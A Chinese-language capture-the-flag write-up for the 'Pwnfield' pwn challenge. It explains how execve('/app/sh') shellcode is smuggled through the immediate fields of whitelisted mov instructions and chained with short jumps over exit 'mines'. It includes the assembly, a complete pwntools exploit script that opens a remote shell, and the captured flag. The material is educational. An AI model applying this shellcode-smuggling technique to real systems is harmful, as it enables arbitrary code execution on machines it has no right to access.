# Pwnfield

## 题目简述

程序在一块 RWX 匿名映射中接收最多 32 条“指令”。每条用户输入必须是 5 字节的 `mov r32, imm32`，其后程序都会插入一段 12 字节的退出代码作为“地雷”。正常顺序执行必然触发地雷，需要利用入口索引计算和 x86 变长指令，从每个 `mov` 的立即数字段中串起 shellcode。

## 解题过程

内存中每一行的布局为：

```text
5-byte user mov | 12-byte exit mine
```

总跨度是 17 字节。真实 ELF 计算入口的逻辑为 $\text{start}=\text{mem}+((17\times\text{index})\bmod 544)+1$。

选择 `index = 33` 时，$(33\times17)\bmod 544+1=18$。

偏移 18 正好是第二条用户指令的第 2 个字节，也就是 `mov` 的 4 字节立即数开头。

每个输入用 `0xbb` 作为首字节，即合法的 `mov ebx, imm32`。把立即数布置成：

```text
xx xx eb 0d
```

从第 2 个字节开始执行时，前两个 `xx` 可以组成一条最多 2 字节的有效指令，后面的 `eb 0d` 是短跳转。跳转从当前行末尾跨过 12 字节地雷和下一行开头的 `0xbb`，恰好落到下一条立即数的第 1 个字节。于是执行流变成：

```text
两字节指令 -> jmp +13 -> 两字节指令 -> jmp +13 -> ...
```

Dockerfile 还创建了 `/app/sh -> /bin/bash` 的符号链接，使 `execve` 所需文件名只有两个字符。进入 RWX 区前，程序把 `eax` 清零，因此可以直接用 `al`、`ah` 拼出空字符结尾的 `sh`。分片指令依次为：

```asm
xor edx, edx
xor esi, esi
mov al, 0x73
mov ah, 0x68
push rax
push rsp
pop rdi
nop
xor eax, eax
mov al, 0x3b
syscall
```

完整利用脚本如下：

```python
import sys
from pwn import remote

io = remote(sys.argv[1], int(sys.argv[2]))

fragments = [
    b"\xBB\x44\x33\x22\x11",  # 第一行不会执行
    b"\xBB\x31\xD2\xEB\x0D",  # xor edx, edx
    b"\xBB\x31\xF6\xEB\x0D",  # xor esi, esi
    b"\xBB\xB0\x73\xEB\x0D",  # mov al, 's'
    b"\xBB\xB4\x68\xEB\x0D",  # mov ah, 'h'
    b"\xBB\x50\x54\xEB\x0D",  # push rax; push rsp
    b"\xBB\x5F\x90\xEB\x0D",  # pop rdi; nop
    b"\xBB\x31\xC0\xEB\x0D",  # xor eax, eax
    b"\xBB\xB0\x3B\xEB\x0D",  # mov al, 59
    b"\xBB\x0F\x05\xEB\x0D",  # syscall
]

for fragment in fragments:
    io.send(fragment)

io.sendline(b"exit")
io.sendline(b"33")
io.interactive()
```

取得 shell 后读取 `flag.txt`：

```text
N0PS{0n3_h45_70_jump_0n_7h3_204d_70_pwnt0p1a}
```

仓库中的 `pwnfield.c` 与随题 ELF 存在版本漂移：文本源码写成 `% 545` 且没有末尾 `+1`，按该公式 `33` 会落到偏移 16；实际 ELF 的反汇编则明确使用 `% 544` 后加 1。上述 payload 已针对随题 ELF 实际运行验证，`index = 33` 能成功进入 shell。

## 方法总结

本题结合了输入白名单、x86 变长指令和短跳转。限制首字节为 `mov` 并不等于限制实际执行指令，因为攻击者可以从立即数字段中间进入。分析此类题时应按真实字节布局计算跳转距离，并以发布的 ELF 为最终证据；当源码、官方说明和二进制不一致时，必须明确记录版本漂移，不能凭源码公式推断远端行为。
